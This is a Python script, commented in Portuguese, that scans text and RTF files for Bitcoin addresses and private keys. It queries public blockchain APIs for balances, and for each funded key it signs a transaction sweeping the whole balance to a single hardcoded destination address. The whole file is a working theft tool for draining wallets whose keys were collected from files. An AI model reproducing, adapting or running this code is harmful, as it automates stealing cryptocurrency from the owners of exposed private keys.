import requests
import re
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def deep_clean_rtf(raw_content):
    """Remove metadados RTF agressivamente para unir strings quebradas"""
    # Remove comandos iniciados por \ (ex: \lang1046, \f0, \fs24)
    text = re.sub(r'\\[a-z0-9]+(?:\s|-?\d+)?', '', raw_content)
    # Remove chaves de controle e quebras de linha ruidosas
    text = re.sub(r'[{}]', '', text)
    # Remove espaços em branco excessivos que podem quebrar chaves/endereços
    return "".join(text.split())

def check_balance_api(address):
    """Consulta saldo com fallback imediato"""
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Prepara o HEX para o broadcast via Shell"""
    try:
        # Busca UTXOs detalhados para assinar
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo")
        utxos = r.json()
        tx = Transaction(network='bitcoin')
        fee = 12000 # Taxa manual prioritária
        amount = utxos_val - fee
        if amount > 546:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            print(f"HEX_GEN:{tx.raw_hex()}")
    except: pass

def run_nuclear_scan():
    print("☢️ INICIANDO VARREDURA DE ALTO IMPACTO...")
    raw_strings = []
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                # Se for RTF, aplica limpeza profunda
                if file_path.endswith('.rtf'):
                    content = deep_clean_rtf(content)
                
                # Captura TUDO: Endereços e Chaves Privadas
                # Endereços: Legacy (1), SegWit (3), Bech32 (bc1)
                raw_strings.extend(re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', content))
                raw_strings.extend(re.findall(r'bc1[a-z0-9]{39,59}', content))
                # Chaves Privadas: WIF (5, L, K) e HEX (64 chars)
                raw_strings.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                raw_strings.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
        except: continue

    unique_items = set(raw_strings)
    print(f"📊 Itens identificados após limpeza: {len(unique_items)}")

    for item in unique_items:
        # Se o item parece ser um endereço público:
        if item.startswith(('1', '3', 'bc1')):
            bal = check_balance_api(item)
            if bal > 0:
                print(f"🚨 SALDO DETECTADO EM ENDEREÇO: {item} | Valor: {bal} sats")
        
        # Se o item parece ser uma chave privada:
        elif len(item) >= 50:
            for comp in [True, False]:
                try:
                    k = Key(item, network='bitcoin', compressed=comp)
                    # Varre os 3 tipos de endereços que esta chave pode gerar
                    for addr in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
                        bal = check_balance_api(addr)
                        if bal > 0:
                            print(f"💰 SALDO EM CHAVE PRIVADA: {addr} | Valor: {bal} sats")
                            create_hex_transaction(addr, item, bal)
                except: continue
        time.sleep(0.2)

if __name__ == "__main__":
    run_nuclear_scan()
    
